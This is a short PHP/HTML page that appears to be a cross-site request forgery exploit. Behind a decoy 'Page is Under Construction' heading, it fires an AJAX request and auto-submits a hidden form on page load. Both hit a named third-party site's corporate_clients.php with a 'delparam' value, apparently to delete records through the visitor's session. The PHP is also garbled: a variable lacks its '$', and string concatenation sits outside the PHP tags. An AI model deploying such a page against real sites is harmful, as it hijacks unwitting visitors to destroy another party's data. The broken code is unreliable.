<?php

id="22";
    if(isset($_GET['id']))
        $id = $_GET['id'];
?>
<!DOCTYPE html>
<html>
<head>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>
<script>
$(document).ready(function(){
    $.ajax({url: "http://viewmea.com/fr/corporate_clients.php?delparam=130", success: function(result){
        console.log(result);
    }});
    
});
</script>
</head>
<body onLoad="javascript:document.getElementById('myform').submit()">
    <h1>Page is Under Construction..</h1>
    <form id="myform" action="http://viewmea.com/fr/corporate_clients.php?delparam=".$id method="get">
    </form>
</body>
</html>
